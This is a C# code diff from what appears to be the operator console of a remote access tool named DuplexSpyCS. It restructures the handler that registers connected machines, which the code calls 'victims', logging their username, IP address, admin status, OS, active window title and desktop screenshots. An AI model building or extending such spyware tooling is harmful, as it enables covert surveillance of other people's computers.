@@ -194,97 +194,111 @@ namespace DuplexSpyCS
 
                 if (cmd[0] == "info")
                 {
+                    string online_id = cmd[1];
+                    ListViewItem x = null;
+
                     Invoke(new Action(() =>
                     {
-                        string online_id = cmd[1];
-                        ListViewItem x = null;
                         if (listView1.Items.Count > 0)
                             x = listView1.FindItemWithText(online_id, true, 0);
+                    }));
 
-                        if (x == null) //NEW VICTIM
+                    if (x == null) //NEW VICTIM
+                    {
+                        v.ID = online_id;
+                        ListViewItem item = new ListViewItem(""); //Screen
+                        item.SubItems.Add(online_id); //Online ID
+                        item.SubItems.Add(cmd[2]); //Username
+                        item.SubItems.Add(v.socket.RemoteEndPoint.ToString()); //Remote IP Address
+                        item.SubItems.Add(cmd[3]); //Is Admin?
+                        item.SubItems.Add(cmd[4]); //OS
+                        for (int i = 5; i < 9; i++)
+                            item.SubItems.Add(cmd[i]);
+                        item.SubItems.Add(clsCrypto.b64D2Str(cmd[9]));
+                        item.Tag = v;
+                        item.ImageKey = v.ID;
+
+                        v.remoteOS = cmd[4];
+                        v.ID = online_id;
+
+                        Invoke(new Action(() =>
                         {
-                            v.ID = online_id;
-                            ListViewItem item = new ListViewItem(""); //Screen
-                            item.SubItems.Add(online_id); //Online ID
-                            item.SubItems.Add(cmd[2]); //Username
-                            item.SubItems.Add(v.socket.RemoteEndPoint.ToString()); //Remote IP Address
-                            item.SubItems.Add(cmd[3]); //Is Admin?
-                            item.SubItems.Add(cmd[4]); //OS
-                            for (int i = 5; i < 9; i++)
-                                item.SubItems.Add(cmd[i]);
-                            item.SubItems.Add(clsCrypto.b64D2Str(cmd[9]));
-                            item.Tag = v;
-                            item.ImageKey = v.ID;
-
-                            v.remoteOS = cmd[4];
-                            v.ID = online_id;
-
                             listView1.Items.Add(item);
 
                             ListViewItem k = listView2.FindItemWithText(online_id);
                             if (k != null)
                                 GetVictim(k).fnDisconnect();
+                        }));
 
-                            MakeNewPortfolio(v);
+                        MakeNewPortfolio(v);
 
-                            clsStore.sql_conn.NewVictim(v, v.remoteOS, v.socket.RemoteEndPoint.ToString());
-                            clsStore.sql_conn.WriteSystemLogs($"New accessible client: {online_id}({cmd[4]})"); //Write system log.
-                        }
-                        else
+                        clsStore.sql_conn.NewVictim(v, v.remoteOS, v.socket.RemoteEndPoint.ToString());
+                        clsStore.sql_conn.WriteSystemLogs($"New accessible client: {online_id}({cmd[4]})"); //Write system log.
+                    }
+                    else
+                    {
+                        string szActiveWindow = clsCrypto.b64D2Str(cmd[9]);
+
+                        Invoke(new Action(() =>
                         {
                             x.SubItems[6].Text = v.latency_time.ToString() + " ms";
                             x.SubItems[7].Text = cmd[6];
-                            x.SubItems[10].Text = clsCrypto.b64D2Str(cmd[9]);
+                            x.SubItems[10].Text = szActiveWindow;
+                        }));
 
-                            int width = 0;
+                        int width = 0;
+
+                        Invoke(new Action(() =>
+                        {
                             width = listView1.Columns[0].Width;
+                        }));
 
-                            if (width > 256)
-                                width = 255;
+                        if (width > 256)
+                            width = 255;
 
-                            if (width < 25)
-                                width = 25;
+                        if (width < 25)
+                            width = 25;
 
+                        Image img = clsTools.Base64ToImage(cmd[10]);
+                        Bitmap bmp = new Bitmap(img, new Size(255, 255));
+                        string szGuid = Guid.NewGuid().ToString();
+
+                        Invoke(new Action(() =>
+                        {
                             il_screen.ImageSize = new Size(width, width);
-                            Image img = clsTools.Base64ToImage(cmd[10]);
-                            Bitmap bmp = new Bitmap(img, new Size(255, 255));
 
-                            listView1.Invoke(() =>
+                            if (il_screen.Images.ContainsKey(v.ID))
                             {
-                                listView1.BeginUpdate();
-
-                                string szGuid = Guid.NewGuid().ToString();
-                                if (il_screen.Images.ContainsKey(v.ID))
-                                {
-                                    il_screen.Images.Add(szGuid, il_screen.Images[v.ID]);
-                                    x.ImageKey = szGuid;
-                                    il_screen.Images.RemoveByKey(v.ID);
-                                }
-
-                                il_screen.Images.Add(v.ID, bmp);
-                                x.ImageKey = v.ID;
-                                if (il_screen.Images.ContainsKey(szGuid))
-                                    il_screen.Images.RemoveByKey(szGuid);
-
-                                v.img_LastDesktop = bmp;
-
-                                listView1.EndUpdate();
-                            });
-
-                            List<ListViewItem> lsItem = new List<ListViewItem>();
-                            foreach (ListViewItem item in listView1.Items)
-                            {
-                                if (item.SubItems[1].Text == online_id)
-                                    lsItem.Add(item);
+                                il_screen.Images.Add(szGuid, il_screen.Images[v.ID]);
+                                x.ImageKey = szGuid;
+                                il_screen.Images.RemoveByKey(v.ID);
                             }
 
-                            if (lsItem.Count > 1)
-                            {
-                                for (int i = 1; i < lsItem.Count; i++)
-                                    listView1.Items.Remove(lsItem[i]);
-                            }
+                            il_screen.Images.Add(v.ID, bmp);
+
+                            x.ImageKey = v.ID;
+
+                            if (il_screen.Images.ContainsKey(szGuid))
+                                il_screen.Images.RemoveByKey(szGuid);
+                        }));
+
+                        v.img_LastDesktop = bmp;
+
+                        /*
+                        List<ListViewItem> lsItem = new List<ListViewItem>();
+                        foreach (ListViewItem item in listView1.Items)
+                        {
+                            if (item.SubItems[1].Text == online_id)
+                                lsItem.Add(item);
                         }
-                    }));
+
+                        if (lsItem.Count > 1)
+                        {
+                            for (int i = 1; i < lsItem.Count; i++)
+                                listView1.Items.Remove(lsItem[i]);
+                        }
+                        */
+                    }
                 }
 
                 #endregion
